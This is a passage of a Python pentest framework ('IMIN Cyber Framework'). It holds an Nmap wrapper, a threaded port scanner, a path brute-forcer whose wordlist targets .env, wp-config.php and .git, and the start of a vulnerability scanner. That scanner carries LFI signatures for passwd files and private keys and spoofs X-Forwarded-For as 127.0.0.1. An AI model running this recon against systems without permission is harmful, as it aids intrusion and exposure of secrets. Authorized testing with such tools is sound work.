#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║   ██╗███╗   ███╗██╗███╗   ██╗    ██████╗██╗   ██╗██████╗ ███████╗██████╗   ║
║   ██║████╗ ████║██║████╗  ██║   ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗  ║
║   ██║██╔████╔██║██║██╔██╗ ██║   ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝  ║
║   ██║██║╚██╔╝██║██║██║╚██╗██║   ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗  ║
║   ██║██║ ╚═╝ ██║██║██║ ╚████║   ╚██████╗   ██║   ██████╔╝███████╗██║  ██║  ║
║   ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝    ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝  ║
║                                                                            ║
║   ███████╗██████╗  █████╗ ███╗   ███╗███████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ║
║   ██╔════╝██╔══██╗██╔══██╗████╗ ████║██╔════╝██║    ██║██╔═══██╗██╔══██╗██║  ║
║   █████╗  ██████╔╝███████║██╔████╔██║█████╗  ██║ █╗ ██║██║   ██║██████╔╝██║  ║
║   ██╔══╝  ██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  ██║███╗██║██║   ██║██╔══██╗██║  ║
║   ██║     ██║  ██║██║  ██║██║ ╚═╝ ██║███████╗╚███╔███╔╝╚██████╔╝██║  ██║██║  ║
║   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ║
║                                                                            ║
╚═══════════════════════════════════════════════════════════════════════════════╝
      ██████╗██╗██████╗ ███████╗██████╗ ███╗   ██╗███████╗████████╗
     ██╔════╝██║██╔══██╗██╔════╝██╔══██╗████╗  ██║██╔════╝╚══██╔══╝
     ██║     ██║██████╔╝█████╗  ██████╔╝██╔██╗ ██║█████╗     ██║
     ██║     ██║██╔══██╗██╔══╝  ██╔══██╗██║╚██╗██║██╔══╝     ██║
     ╚██████╗██║██║  ██║███████╗██║  ██║██║ ╚████║███████╗   ██║
      ╚═════╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝

   ╔═══════════════════════════════════════════════════════════════════════════╗
   ║  Author: IMIN  |  Telegram: @script_ill  |  v3.0 PRO EDITION            ║
   ║  Multi-Layer Pentest Engine — AI Recon, Exploit Assist, OSINT Suite    ║
   ╚═══════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import socket
import random
import string
import base64
import hashlib
import requests
import subprocess
import threading
from typing import *
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue

# ============================================================================
# COLOR ENGINE — PRO THEME (CYBERPUNK NEON)
# ============================================================================

class Color:
    """Advanced color system with themes."""

    # Base colors
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    B = '\033[94m'
    M = '\033[95m'
    C = '\033[96m'
    W = '\033[97m'
    NC = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    BLINK = '\033[5m'
    REV = '\033[7m'

    # Neon theme
    NEON_GREEN = '\033[38;5;82m'
    NEON_PINK = '\033[38;5;198m'
    NEON_BLUE = '\033[38;5;45m'
    NEON_YELLOW = '\033[38;5;226m'
    NEON_ORANGE = '\033[38;5;208m'
    NEON_PURPLE = '\033[38;5;129m'
    NEON_CYAN = '\033[38;5;51m'
    NEON_RED = '\033[38;5;196m'

    # Backgrounds
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_DARK = '\033[48;5;232m'

    @staticmethod
    def gradient(text: str, start_color: str, end_color: str) -> str:
        """Simple gradient effect (works best on supported terminals)."""
        # For simplicity, just return with start color
        return f"{start_color}{text}{Color.NC}"

    @staticmethod
    def p_success(msg): return f"{Color.G}[✔] {msg}{Color.NC}"

    @staticmethod
    def p_error(msg): return f"{Color.R}[✘] {msg}{Color.NC}"

    @staticmethod
    def p_warning(msg): return f"{Color.Y}[⚠] {msg}{Color.NC}"

    @staticmethod
    def p_info(msg): return f"{Color.C}[*] {msg}{Color.NC}"

    @staticmethod
    def p_found(msg): return f"{Color.NEON_GREEN}[💀] {msg}{Color.NC}"

    @staticmethod
    def p_debug(msg): return f"{Color.DIM}[.] {msg}{Color.NC}"

    @staticmethod
    def p_banner(text: str): return f"{Color.NEON_CYAN}{text}{Color.NC}"

    @staticmethod
    def p_question(text: str): return f"{Color.NEON_YELLOW}{text}{Color.NC}"


# ============================================================================
# BANNER ENGINE — MULTIPLE BANNERS
# ============================================================================

BANNERS = [
    # Banner 1 — Cyber Skull (Default)
    f"""{Color.G}
   .:                                                       :.
   %#**+=.                                             .=++*#%
   @@@@%%= ++:                                     :=+ =%@@@@@
    @@@@@@@                                            @@@@@@@
    +@@@@@@%         :+=:              :=+:          %@@@@@@+
      #@@@@@@@@=:..:@@@@%#*+.        .+*#%@@@@:..:=@@@@@@@@#
       :@@@@@@@@@@@@@@@@@@%            %@@@@@@@@@@@@@@@@@@:
         :@@@@@@@@@@@@@@*                #@@@@@@@@@@@@@@:
             =#@@@@@+:                      :+%@@@@*=

     ╦┌┬┐┬┌┐┌   ╔═╗┬ ┬┌┐ ┌─┐┬─┐   ╔═╗┬─┐┌─┐┌┬┐┌─┐┬ ┬┌─┐┬─┐┬┌─
     ║│││││││───║  └┬┘├┴┐├┤ ├┬┘───╠╣ ├┬┘├─┤│││├┤ ││││ │├┬┘├┴┐
     ╩┴ ┴┴┘└┘   ╚═╝ ┴ └─┘└─┘┴└─   ╚  ┴└─┴ ┴┴ ┴└─┘└┴┘└─┘┴└─┴ ┴
{Color.NC}""",
    # Banner 2 — Matrix Style
    f"""{Color.NEON_CYAN}
██╗███╗░░░███╗██╗███╗░░██╗  ░█████╗░██╗██████╗░██████╗░███████╗██████╗░
██║████╗░████║██║████╗░██║  ██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║██╔████╔██║██║██╔██╗██║  ██║░░╚═╝██║██████╔╝██████╦╝█████╗░░██████╔╝
██║██║╚██╔╝██║██║██║╚████║  ██║░░██╗██║██╔══██╗██╔══██╗██╔══╝░░██╔══██╗
██║██║░╚═╝░██║██║██║░╚███║  ╚█████╔╝██║██║░░██║██████╦╝███████╗██║░░██║
╚═╝╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝  ░╚════╝░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝
{Color.NC}""",
    # Banner 3 — Dragon Eye
    f"""{Color.NEON_RED}
  .:                                                      :.
  %#**+=.                                            .=++*#%
  @@@@%%= ++:                                    :=+ =%@@@@@
   @@@@@@@                                           @@@@@@@
   +@@@@@@%         :+=:              :=+:          %@@@@@@+
    #@@@@@@@@=:..:@@@@%#*+.        .+*#%@@@@:..:=@@@@@@@@#
     :@@@@@@@@@@@@@@@@@@%            %@@@@@@@@@@@@@@@@@@:
       :@@@@@@@@@@@@@@*                #@@@@@@@@@@@@@@:
           =#@@@@@+:                      :+%@@@@*=

{Color.NC}"""
]

BANNER_CHOICES = {
    "1": BANNERS[0],
    "2": BANNERS[1],
    "3": BANNERS[2]
}


def print_banner(banner_num: str = "1") -> None:
    """Print selected banner with header info."""
    os.system('cls' if os.name == 'nt' else 'clear')

    banner = BANNER_CHOICES.get(banner_num, BANNERS[0])
    print(banner)

    # Header info box
    width = 66
    print(f"{Color.NEON_PURPLE}╔{'═' * width}╗{Color.NC}")

    title = f"IMIN CYBER FRAMEWORK v3.0 PRO EDITION"
    print(f"{Color.NEON_PURPLE}║{Color.NC}{Color.NEON_YELLOW}{title:^{width}}{Color.NC}{Color.NEON_PURPLE}║{Color.NC}")

    print(f"{Color.NEON_PURPLE}╠{'═' * width}╣{Color.NC}")

    items = [
        ("Author", "IMIN"),
        ("Contact", "@script_ill"),
        ("Engine", "Multi-Layer Pentest Suite"),
        ("Modules", "12 Active"),
        ("Date", datetime.now().strftime("%Y-%m-%d %H:%M"))
    ]

    for label, value in items:
        line = f"{Color.DIM}│{Color.NC} {Color.NEON_CYAN}{label}:{Color.NC}{' ' * (12 - len(label))}{Color.W}{value}{Color.NC}"
        print(f"{line}{' ' * (width - len(line) + 28)}{Color.NEON_PURPLE}║{Color.NC}" if len(line) < width + 30 else line)

    print(f"{Color.NEON_PURPLE}╚{'═' * width}╝{Color.NC}")
    print()


# ============================================================================
# REPORT SYSTEM
# ============================================================================

class Report:
    """Professional scan report generator."""

    def __init__(self):
        self.logs: List[str] = []
        self.findings: List[Dict] = []
        self.start_time = datetime.now()
        self._lock = threading.Lock()

    def log(self, data: str, color: str = Color.W) -> None:
        """Add a log entry."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        entry = f"[{timestamp}] {data}"
        with self._lock:
            self.logs.append(entry)
        print(f"{color}{data}{Color.NC}")

    def add_finding(self, finding_type: str, target: str, severity: str, detail: str) -> None:
        """Add a security finding."""
        finding = {
            "type": finding_type,
            "target": target,
            "severity": severity,
            "detail": detail,
            "timestamp": datetime.now().isoformat()
        }
        with self._lock:
            self.findings.append(finding)

        sev_color = {
            "CRITICAL": Color.NEON_RED,
            "HIGH": Color.R,
            "MEDIUM": Color.Y,
            "LOW": Color.C,
            "INFO": Color.G
        }.get(severity.upper(), Color.W)

        sev_icon = {
            "CRITICAL": "🔥",
            "HIGH": "💀",
            "MEDIUM": "⚠️",
            "LOW": "•",
            "INFO": "ℹ️"
        }.get(severity.upper(), "•")

        self.log(f"  {sev_icon} [{sev_color}{severity}{Color.NC}] {finding_type}: {detail}", sev_color)

    def success(self, msg: str) -> None:
        self.log(Color.p_success(msg))

    def error(self, msg: str) -> None:
        self.log(Color.p_error(msg))

    def warning(self, msg: str) -> None:
        self.log(Color.p_warning(msg))

    def info(self, msg: str) -> None:
        self.log(Color.p_info(msg))

    def found(self, msg: str) -> None:
        self.log(Color.p_found(msg))

    def save(self) -> str:
        """Generate and save a professional HTML report."""
        duration = (datetime.now() - self.start_time).total_seconds()

        report_dir = "reports"
        os.makedirs(report_dir, exist_ok=True)

        filename = f"{report_dir}/scan_report_{self.start_time.strftime('%Y%m%d_%H%M%S')}.html"

        # Count severities
        severities = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        for f in self.findings:
            s = f["severity"].upper()
            if s in severities:
                severities[s] += 1

        critical_count = severities["CRITICAL"] + severities["HIGH"]

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IMIN Cyber Framework — Scan Report</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Segoe UI', 'Courier New', monospace;
            background: #0a0a0f;
            color: #e0e0e0;
            padding: 20px;
        }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        .header {{
            background: linear-gradient(135deg, #0d0d1a, #1a0a2e);
            border: 1px solid #00ff88;
            border-radius: 8px;
            padding: 30px;
            text-align: center;
            margin-bottom: 20px;
        }}
        .header h1 {{ color: #00ff88; font-size: 2em; text-shadow: 0 0 20px #00ff8844; }}
        .header h2 {{ color: #ff00ff; font-size: 1.2em; margin-top: 5px; }}
        .header .meta {{ color: #888; margin-top: 10px; font-size: 0.9em; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px; margin-bottom: 20px; }}
        .stat-card {{
            background: #111;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 15px;
            text-align: center;
        }}
        .stat-card.critical {{ border-color: #ff0044; }}
        .stat-card.high {{ border-color: #ff4400; }}
        .stat-card.medium {{ border-color: #ffaa00; }}
        .stat-card.low {{ border-color: #00aaff; }}
        .stat-card .number {{ font-size: 2em; font-weight: bold; }}
        .stat-card .label {{ color: #888; font-size: 0.85em; }}
        .severity-critical .number {{ color: #ff0044; }}
        .severity-high .number {{ color: #ff4400; }}
        .severity-medium .number {{ color: #ffaa00; }}
        .severity-low .number {{ color: #00aaff; }}
        .severity-info .number {{ color: #00ff88; }}
        .findings {{ background: #111; border: 1px solid #222; border-radius: 8px; padding: 20px; margin-bottom: 20px; }}
        .findings h3 {{ color: #00ff88; margin-bottom: 15px; }}
        .finding-item {{
            padding: 10px;
            margin-bottom: 8px;
            border-left: 3px solid #333;
            background: #0d0d0d;
            border-radius: 0 4px 4px 0;
        }}
        .finding-item.severity-CRITICAL {{ border-left-color: #ff0044; }}
        .finding-item.severity-HIGH {{ border-left-color: #ff4400; }}
        .finding-item.severity-MEDIUM {{ border-left-color: #ffaa00; }}
        .finding-item.severity-LOW {{ border-left-color: #00aaff; }}
        .finding-item.severity-INFO {{ border-left-color: #00ff88; }}
        .finding-item .sev-badge {{
            display: inline-block;
            padding: 2px 8px;
            border-radius: 3px;
            font-size: 0.75em;
            font-weight: bold;
            margin-right: 8px;
        }}
        .sev-badge.CRITICAL {{ background: #ff0044; color: #fff; }}
        .sev-badge.HIGH {{ background: #ff4400; color: #fff; }}
        .sev-badge.MEDIUM {{ background: #ffaa00; color: #000; }}
        .sev-badge.LOW {{ background: #00aaff; color: #000; }}
        .sev-badge.INFO {{ background: #00ff88; color: #000; }}
        .finding-item .target {{ color: #00aaff; }}
        .finding-item .detail {{ color: #ccc; margin-top: 4px; font-size: 0.9em; }}
        .logs {{ background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 8px; padding: 20px; }}
        .logs h3 {{ color: #00ff88; margin-bottom: 15px; }}
        .log-entry {{ padding: 3px 0; font-family: 'Courier New', monospace; font-size: 0.85em; color: #888; }}
        .footer {{ text-align: center; color: #444; margin-top: 30px; padding: 20px; font-size: 0.85em; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>💀 IMIN CYBER FRAMEWORK</h1>
            <h2>Penetration Test Report</h2>
            <div class="meta">
                Generated: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')} |
                Duration: {duration:.1f}s |
                Author: IMIN
            </div>
        </div>

        <div class="stats">
            <div class="stat-card critical"><div class="number" style="color:#ff0044">{severities['CRITICAL']}</div><div class="label">Critical</div></div>
            <div class="stat-card high"><div class="number" style="color:#ff4400">{severities['HIGH']}</div><div class="label">High</div></div>
            <div class="stat-card medium"><div class="number" style="color:#ffaa00">{severities['MEDIUM']}</div><div class="label">Medium</div></div>
            <div class="stat-card low"><div class="number" style="color:#00aaff">{severities['LOW']}</div><div class="label">Low</div></div>
            <div class="stat-card"><div class="number" style="color:#00ff88">{severities['INFO']}</div><div class="label">Info</div></div>
            <div class="stat-card"><div class="number" style="color:#fff">{len(self.findings)}</div><div class="label">Total Findings</div></div>
        </div>

        <div class="findings">
            <h3>⚠️ Security Findings ({len(self.findings)})</h3>
"""

        if not self.findings:
            html += "            <p style='color:#666'>No findings recorded.</p>\n"
        else:
            for f in self.findings:
                sev = f['severity'].upper()
                html += f"""            <div class="finding-item severity-{sev}">
                <span class="sev-badge {sev}">{sev}</span>
                <span class="target">{f['target']}</span>
                <span style="color:#888">— {f['type']}</span>
                <div class="detail">{f['detail']}</div>
            </div>
"""

        html += """        </div>

        <div class="logs">
            <h3>📋 Scan Logs</h3>
"""

        for entry in self.logs[-100:]:  # Last 100 entries
            safe_entry = entry.replace("<", "&lt;").replace(">", "&gt;")
            html += f'            <div class="log-entry">{safe_entry}</div>\n'

        html += f"""        </div>

        <div class="footer">
            IMIN Cyber Framework v3.0 PRO | Authorized Security Testing Only<br>
            Generated by IMIN | Telegram: @script_ill
        </div>
    </div>
</body>
</html>"""

        with open(filename, 'w') as f:
            f.write(html)

        self.success(f"Report saved: {filename}")
        return filename


# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def ensure_url(url: str) -> str:
    """Ensure URL has a scheme."""
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url.rstrip('/')


def resolve_target(target: str) -> Tuple[Optional[str], Optional[str]]:
    """Resolve a target to IP, return (ip, hostname)."""
    try:
        # Check if it's already an IP
        socket.inet_aton(target)
        return target, None
    except socket.error:
        pass

    try:
        ip = socket.gethostbyname(target)
        return ip, target
    except socket.gaierror:
        return None, target


def get_common_ports() -> Dict[int, str]:
    """Return dict of common ports and their services."""
    return {
        21: "FTP",
        22: "SSH",
        23: "Telnet",
        25: "SMTP",
        53: "DNS",
        80: "HTTP",
        110: "POP3",
        111: "RPC",
        135: "RPC",
        139: "NetBIOS",
        143: "IMAP",
        443: "HTTPS",
        445: "SMB",
        993: "IMAPS",
        995: "POP3S",
        1433: "MSSQL",
        1521: "Oracle",
        2049: "NFS",
        3306: "MySQL",
        3389: "RDP",
        5432: "PostgreSQL",
        5900: "VNC",
        5985: "WinRM-HTTP",
        5986: "WinRM-HTTPS",
        6379: "Redis",
        8080: "HTTP-Alt",
        8443: "HTTPS-Alt",
        9090: "WebLogic",
        27017: "MongoDB"
    }


def get_common_dirs() -> List[str]:
    """Return common directory wordlist."""
    return [
        # Admin panels
        "admin", "administrator", "admincp", "adminpanel", "cpanel", "whm",
        "wp-admin", "dashboard", "manager", "login", "signin", "auth",
        # Configuration
        "config", "configuration", "settings", "setup", "install", "env",
        ".env", "wp-config.php", "config.php", "database", "db",
        # Common paths
        "api", "v1", "v2", "graphql", "rest", "swagger", "docs",
        "uploads", "assets", "static", "public", "media", "files",
        "backup", "backups", "old", "test", "dev", "development",
        ".git", ".svn", ".DS_Store", "robots.txt", "sitemap.xml",
        "server-status", "server-info", "phpinfo", "info",
        # Sensitive
        "private", "secret", "internal", "hidden", "debug", "log",
        "logs", "error", "errors", "exception", "trace",
        "shell", "cmd", "command", "exec", "console", "terminal",
        "phpmyadmin", "mysql", "phpPgAdmin", "adminer",
        "xmlrpc.php", "wp-json", "wp-content", "wp-includes",
        "crossdomain.xml", "clientaccesspolicy.xml",
    ]


def get_security_headers() -> List[str]:
    """Return list of security headers to check."""
    return [
        "Strict-Transport-Security",
        "Content-Security-Policy",
        "X-Frame-Options",
        "X-Content-Type-Options",
        "X-XSS-Protection",
        "Referrer-Policy",
        "Permissions-Policy",
        "Feature-Policy",
        "Access-Control-Allow-Origin",
        "Public-Key-Pins"
    ]


# ============================================================================
# MODULE 1: NETWORK SCANNER (NMAP WRAPPER)
# ============================================================================

class NetworkScanner:
    """Network scanning module using Nmap with Python integration."""

    def __init__(self, report: Report):
        self.report = report

    def run(self) -> None:
        """Run network scan."""
        target = input(f"\n{Color.p_question('Enter IP/CIDR target: ')}")

        self.report.info(f"Network Scan — Target: {target}")
        self.report.info("Select scan type:")
        print(f"  {Color.NEON_CYAN}[1]{Color.NC} Quick Scan (top 100 ports)")
        print(f"  {Color.NEON_CYAN}[2]{Color.NC} Full Scan (1-65535)")
        print(f"  {Color.NEON_CYAN}[3]{Color.NC} Service Version Detection")
        print(f"  {Color.NEON_CYAN}[4]{Color.NC} OS Detection")
        print(f"  {Color.NEON_CYAN}[5]{Color.NC} Aggressive (everything)")
        print(f"  {Color.NEON_CYAN}[6]{Color.NC} Custom Nmap arguments")

        scan_type = input(f"\n{Color.p_question('Select [1-6]: ')}").strip()

        scan_args = {
            "1": "-sn",
            "2": "-sn",
            "3": "-sV",
            "4": "-O",
            "5": "-A",
            "6": ""
        }

        nmap_args = scan_args.get(scan_type, "-sV")

        if scan_type == "1":
            nmap_args = "-F -T4"
        elif scan_type == "2":
            nmap_args = "-p- -T4"
        elif scan_type == "6":
            nmap_args = input(f"{Color.p_question('Enter Nmap arguments: ')}")

        # Check if Nmap is installed
        try:
            subprocess.run(["nmap", "--version"], capture_output=True, check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            self.report.warning("Nmap not found. Running Python fallback port scanner.")
            self._fallback_scan(target)
            return

        cmd = ["nmap", *nmap_args.split(), target]
        cmd_str = " ".join(cmd)

        self.report.info(f"Executing: {Color.DIM}{cmd_str}{Color.NC}")
        self.report.info("Scanning... this may take a while.\n")

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            output = result.stdout + result.stderr

            # Parse and display results
            print(f"\n{Color.NEON_PURPLE}{'─' * 60}{Color.NC}")

            for line in output.split('\n'):
                if 'open' in line.lower() and '/' in line:
                    port_info = line.strip()
                    service = port_info.split()[-1] if len(port_info.split()) > 1 else "unknown"
                    self.report.found(f"Port Open: {port_info}")
                elif 'host is up' in line.lower():
                    self.report.success(f"Host is up: {line.strip()}")
                elif line.strip():
                    print(f"  {Color.DIM}{line.strip()}{Color.NC}")

            print(f"\n{Color.NEON_PURPLE}{'─' * 60}{Color.NC}")
            self.report.success("Nmap scan completed")

        except subprocess.TimeoutExpired:
            self.report.error("Nmap scan timed out (300s)")
        except Exception as e:
            self.report.error(f"Nmap scan failed: {e}")
            self._fallback_scan(target)

    def _fallback_scan(self, target: str) -> None:
        """Python fallback when Nmap is unavailable."""
        self.report.info("Using Python fallback scanner...")

        ip, hostname = resolve_target(target)
        if not ip:
            self.report.error(f"Cannot resolve target: {target}")
            return

        self.report.info(f"Resolved: {ip}")
        self.report.info("Scanning common ports...")

        ports = get_common_ports()
        open_ports = []

        def scan_port(port: int) -> Optional[int]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.5)
                result = sock.connect_ex((ip, port))
                sock.close()
                if result == 0:
                    return port
            except:
                pass
            return None

        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(scan_port, p): p for p in ports}
            for future in as_completed(futures):
                port = futures[future]
                try:
                    result = future.result()
                    if result:
                        open_ports.append(port)
                        service = ports.get(port, "Unknown")
                        self.report.found(f"Port {port}/tcp — {service}")
                except:
                    pass

        if not open_ports:
            self.report.warning("No open ports found")

        self.report.success(f"Fallback scan complete — {len(open_ports)} open ports")


# ============================================================================
# MODULE 2: WEB SCANNER
# ============================================================================

class WebScanner:
    """Advanced web application scanner."""

    def __init__(self, report: Report):
        self.report = report
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        })

    def run(self) -> None:
        """Run web scan."""
        url = input(f"\n{Color.p_question('Enter target URL: ')}")
        url = ensure_url(url)

        self.report.info(f"Web Scan — Target: {url}")

        # Check reachability
        try:
            r = self.session.get(url, timeout=10)
            self.report.success(f"Target reachable — Status: {r.status_code}")
            self.report.info(f"Response Size: {len(r.content):,} bytes")
            self.report.info(f"Content Type: {r.headers.get('Content-Type', 'Unknown')}")
        except requests.exceptions.RequestException as e:
            self.report.error(f"Target unreachable: {e}")
            return

        # Run checks in parallel
        self._check_security_headers(url)
        self._check_technologies(url, r)
        self._scan_paths(url)
        self._check_ssl(url)

        self.report.success("Web scan completed")

    def _check_security_headers(self, url: str) -> None:
        """Check for security headers."""
        self.report.info("Checking security headers...")

        try:
            r = self.session.get(url, timeout=10)
            headers = r.headers

            for header in get_security_headers():
                if header in headers:
                    self.report.success(f"Header present: {header}: {headers[header][:60]}")
                else:
                    sev = "MEDIUM" if header in ["Content-Security-Policy", "Strict-Transport-Security", "X-Frame-Options"] else "LOW"
                    self.report.add_finding("Missing Security Header", url, sev, f"{header} is missing")

        except Exception as e:
            self.report.warning(f"Header check error: {e}")

    def _check_technologies(self, url: str, response: requests.Response) -> None:
        """Detect web technologies."""
        self.report.info("Detecting technologies...")

        headers = response.headers
        server = headers.get("Server", "")
        powered_by = headers.get("X-Powered-By", "")

        if server:
            self.report.info(f"Server: {server}")
        if powered_by:
            self.report.info(f"Powered by: {powered_by}")

        # Check for common CMS signatures
        body = response.text.lower()

        cms_signatures = {
            "WordPress": ["wp-content", "wp-includes", "wordpress"],
            "Joomla": ["joomla", "com_content", "com_modules"],
            "Drupal": ["drupal", "sites/default", "core/themes"],
            "Shopify": ["shopify", "myshopify.com", ".shopify.com"],
            "Laravel": ["laravel", "csrf-token"],
            "Django": ["csrfmiddlewaretoken", "django"],
            "ASP.NET": ["__VIEWSTATE", "__EVENTVALIDATION"],
            "PHP": ["PHPSESSID"],
        }

        detected = []
        for cms, sigs in cms_signatures.items():
            if any(sig in body for sig in sigs):
                detected.append(cms)

        if detected:
            self.report.found(f"Technologies detected: {', '.join(detected)}")
        else:
            self.report.info("No specific CMS signatures detected")

    def _scan_paths(self, url: str) -> None:
        """Bruteforce common paths."""
        self.report.info("Scanning common paths...")

        paths = get_common_dirs()
        found = []

        def check_path(path: str) -> Optional[Tuple[str, int]]:
            test_url = f"{url}/{path}"
            try:
                r = self.session.get(test_url, timeout=5, allow_redirects=False)
                if r.status_code in [200, 301, 302, 401, 403, 500]:
                    return (path, r.status_code)
            except:
                pass
            return None

        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = {executor.submit(check_path, p): p for p in paths}
            for future in as_completed(futures):
                path = futures[future]
                try:
                    result = future.result()
                    if result:
                        found.append(result)
                        path_found, status = result

                        color = Color.G if status == 200 else Color.Y if status in [301, 302] else Color.C
                        sev = "HIGH" if status == 200 else "MEDIUM" if status in [301, 302] else "LOW"

                        self.report.found(f"[{status}] {url}/{path_found}")
                        self.report.add_finding("Exposed Path", f"{url}/{path_found}", sev,
                                              f"Path returns HTTP {status}")
                except:
                    pass

        if not found:
            self.report.info("No interesting paths found")
        else:
            self.report.info(f"Found {len(found)} accessible paths")

    def _check_ssl(self, url: str) -> None:
        """Check SSL/TLS configuration."""
        if not url.startswith("https://"):
            return

        self.report.info("Checking SSL/TLS...")

        import ssl
        import socket as sock_module

        hostname = urlparse(url).hostname
        port = 443

        try:
            context = ssl.create_default_context()
            with sock_module.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()

                    # Check expiry
                    from datetime import datetime as dt
                    not_after = cert.get('notAfter', '')
                    if not_after:
                        expiry = dt.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
                        days_left = (expiry - dt.now()).days

                        if days_left < 0:
                            self.report.add_finding("SSL Certificate Expired", hostname, "HIGH",
                                                  f"Certificate expired {abs(days_left)} days ago")
                        elif days_left < 30:
                            self.report.add_finding("SSL Certificate Expiring Soon", hostname, "MEDIUM",
                                                  f"Certificate expires in {days_left} days")
                        else:
                            self.report.success(f"SSL Certificate valid for {days_left} more days")

                    # Check SSL version
                    version = ssock.version()
                    self.report.info(f"SSL/TLS Version: {version}")

                    if version in ["TLSv1", "TLSv1.1"]:
                        self.report.add_finding("Outdated TLS Version", hostname, "HIGH",
                                              f"Using {version} — should upgrade to TLS 1.2+")

        except Exception as e:
            self.report.warning(f"SSL check error: {e}")


# ============================================================================
# MODULE 3: VULNERABILITY SCANNER
# ============================================================================

class VulnerabilityScanner:
    """Advanced multi-vector vulnerability scanner."""

    SQL_ERRORS = [
        "sql", "syntax", "mysql", "mariadb", "postgresql",
        "ora-", "sqlite", "odbc", "warning: mysql", "unclosed quotation mark",
        "you have an error in your sql", "division by zero",
        "supplied argument is not a valid mysql", "mysql_fetch",
        "mysql_num_rows", "mysql_query", "mysqli_query",
        "pg_query", "pg_execute", "sqlsrv_query",
        "PDOException", "SQLSTATE", "DB_ERROR"
    ]

    LFI_SIGNATURES = [
        "root:", "bin:", "daemon:", "nobody:", "/bin/bash",
        "/bin/sh", ":/home/", ":/root:", "ssh-rsa",
        "ssh-dss", "BEGIN RSA PRIVATE KEY"
    ]

    def __init__(self, report: Report):
        self.report = report
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "X-Forwarded-For": "127.0.0.1"
        })

    def run(self) -> None:
        """Run full vulnerability scan."""
        url = input(f"\n{Color.p_question('Enter target URL: ')}")
        url = ensure_url(url)

        self.report.info(f"Vulnerability Scan — Target: {url}")
        self.report.info("Running multi-vector scan...\n")

        # Run all checks in parallel
        checks = [
            ("SQL Injection", self._check_sqli),
            ("Cross-Site Scripting (XSS)", self._check_xss),
            ("Local File Inclusion (LFI)", self._check_lfi),
            ("Remote File Inclusion (RFI)", self._check_rfi),
            ("Command Injection", self._check_cmdi),
            ("Open Redirect", self._check_open_redirect),
            ("Security Headers", self._check_headers),
            ("CORS Misconfiguration", self._check_cors),
            ("Server Info Disclosure", self._check_info_disclosure),
            ("HTTP Methods", self._check_http_methods),
        ]

        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(check_fn, url): check_name for check_name, check_fn in checks}
            for future in as_completed(futures):
                check_name = futures[future]
                try:
                    future.result()
                except Exception as e:
                    self.report.warning(f"{check_name} check failed: {e}")

        print()
        self.report.success("Vulnerability scan completed")

    def _extract_params(self, url: str) -> Tuple[str, List[str]]:
        """Extract base URL and parameters."""
        parsed = urlparse(url)
        if parsed.query:
            params = [p.split('=')[0] for p in parsed.query.split('&')]
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            return base, params
        return url, ["id", "page", "file", "cat", "product", "search", "q"]

    def _test_endpoint(self, url: str, param: str, payload: str) -> Optional[requests.Response]:
        """Test a parameter with a payload."""
        try:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            test_url = f"{base}?{param}={quote(payload)}"

            if parsed.query:
                other_params = [p for p in parsed.query.split('&') if not p.startswith(param + '=')]
                if other_params:
                    test_url += "&" + "&".join(other_params)

            return self.session.get(test_url, timeout=8)
